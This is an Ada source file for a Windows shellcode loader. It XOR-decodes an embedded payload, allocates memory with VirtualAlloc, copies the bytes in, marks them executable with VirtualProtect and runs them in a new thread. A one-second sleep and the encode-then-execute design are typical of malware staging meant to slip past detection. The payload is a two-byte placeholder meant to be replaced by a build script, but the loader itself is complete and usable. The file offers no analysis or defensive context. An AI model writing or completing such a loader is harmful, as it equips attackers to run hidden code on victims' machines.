with Ada.Unchecked_Conversion;
with Interfaces;
with Interfaces.C;
with System;
with System.Storage_Elements;

procedure Loader is
   package C renames Interfaces.C;
   use type C.size_t;
   use type C.int;

   type HANDLE is new C.size_t;
   type DWORD is new C.unsigned_long;
   type SIZE_T is new C.size_t;
   type LPVOID is new System.Address;

   function VirtualAlloc(lpAddress: LPVOID; dwSize: SIZE_T; 
      flAllocationType: DWORD; flProtect: DWORD) return LPVOID;
   pragma Import(Stdcall, VirtualAlloc, "VirtualAlloc");

   function VirtualProtect(lpAddress: LPVOID; dwSize: SIZE_T;
      flNewProtect: DWORD; lpflOldProtect: access DWORD) return C.int;
   pragma Import(Stdcall, VirtualProtect, "VirtualProtect");

   function CreateThread(lpThreadAttributes: LPVOID; dwStackSize: SIZE_T;
      lpStartAddress: LPVOID; lpParameter: LPVOID; dwCreationFlags: DWORD;
      lpThreadId: access DWORD) return HANDLE;
   pragma Import(Stdcall, CreateThread, "CreateThread");

   function WaitForSingleObject(hHandle: HANDLE; dwMilliseconds: DWORD) return DWORD;
   pragma Import(Stdcall, WaitForSingleObject, "WaitForSingleObject");

   procedure Sleep(dwMilliseconds: DWORD);
   pragma Import(Stdcall, Sleep, "Sleep");

   type Byte is new Interfaces.Unsigned_8;
   type Byte_Array is array (Positive range <>) of Byte;

   function To_Address is new Ada.Unchecked_Conversion(LPVOID, System.Address);
   function To_LPVOID is new Ada.Unchecked_Conversion(System.Address, LPVOID);

   procedure Decode(Buf: in out Byte_Array; Key: Interfaces.Unsigned_8) is
      use Interfaces;
   begin
      for I in Buf'Range loop
         Buf(I) := Buf(I) xor 
            Byte((Key + Unsigned_8((I - Buf'First) mod 256)) and 16#FF#);
      end loop;
   end Decode;

   Payload: Byte_Array := (
      -- PLACEHOLDER: Will be replaced by build script
      16#90#, 16#90#
   );

   XOR_Key: constant Interfaces.Unsigned_8 := 0;
   Mem: LPVOID;
   Old_Protect: aliased DWORD;
   Thread_Handle: HANDLE;
   Thread_Id: aliased DWORD;

begin
   Sleep(1000);
   Decode(Payload, XOR_Key);

   Mem := VirtualAlloc(To_LPVOID(System.Null_Address), SIZE_T(Payload'Length),
                       16#3000#, 16#04#);

   if Mem = To_LPVOID(System.Null_Address) then
      return;
   end if;

   declare
      Dest: System.Address := To_Address(Mem);
      use System.Storage_Elements;
      type Byte_Ptr is access all Byte;
      function To_Ptr is new Ada.Unchecked_Conversion(System.Address, Byte_Ptr);
   begin
      for I in Payload'Range loop
         To_Ptr(Dest).all := Payload(I);
         Dest := Dest + 1;
      end loop;
   end;

   if VirtualProtect(Mem, SIZE_T(Payload'Length), 16#20#, Old_Protect'Access) = 0 then
      return;
   end if;

   Thread_Handle := CreateThread(To_LPVOID(System.Null_Address), 0, Mem, 
                          To_LPVOID(System.Null_Address), 0, Thread_Id'Access);

   if Thread_Handle /= 0 then
      declare
         Result: constant DWORD := WaitForSingleObject(Thread_Handle, 16#FFFFFFFF#);
      begin
         null;
      end;
   end if;
end Loader;
